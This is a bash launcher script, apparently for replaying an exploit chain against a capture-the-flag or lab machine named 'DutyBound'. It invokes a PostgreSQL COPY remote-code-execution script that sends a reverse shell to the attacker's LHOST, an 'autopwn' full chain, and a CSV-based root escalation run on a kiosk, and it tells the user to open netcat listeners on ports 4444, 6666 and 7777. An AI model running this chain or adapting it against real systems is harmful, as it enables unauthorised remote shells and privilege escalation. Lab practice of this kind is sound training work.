#!/usr/bin/env bash
# DutyBound replay. No secrets in this file.
#   export TARGET=10.129.x.x LHOST=10.10.x.x
#   ./replay.sh hosts
#   ./replay.sh postgres          # COPY reverse to LHOST:4444
#   ./replay.sh autopwn           # full chain (open nc 6666 + 7777 first)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

die() { echo "[-] $*" >&2; exit 1; }
need_target() { [[ -n "${TARGET:-}" ]] || die "export TARGET=<ip>"; }
need_lhost() { [[ -n "${LHOST:-}" ]] || die "export LHOST=<tun0>"; }

cmd="${1:-help}"
shift || true

case "$cmd" in
  hosts)
    need_target
    TARGET="$TARGET" ./01-hosts.sh
    ;;
  postgres)
    need_target
    need_lhost
    python3 ./02-postgres-rce.py --target "$TARGET" --lhost "$LHOST" --lport "${LPORT:-4444}"
    ;;
  autopwn)
    need_target
    need_lhost
    python3 ./autopwn.py --target "$TARGET" --lhost "$LHOST" \
      --http-port "${HTTP_PORT:-8088}" \
      --kiosk-port "${KIOSK_PORT:-6666}" \
      --root-port "${ROOT_PORT:-7777}"
    ;;
  csv)
    die "run 04-csv-root.sh ON the kiosk as dutyfree-kiosk (pos-ops)"
    ;;
  help|*)
    cat <<EOF
DutyBound replay (export TARGET, LHOST)

  $0 hosts
  $0 postgres      # listen: nc -lvnp 4444
  $0 autopwn       # listen: nc -lvnp 6666 and 7777 first
  # on kiosk: LHOST=... ROOT_PORT=7777 ./04-csv-root.sh
EOF
    ;;
esac
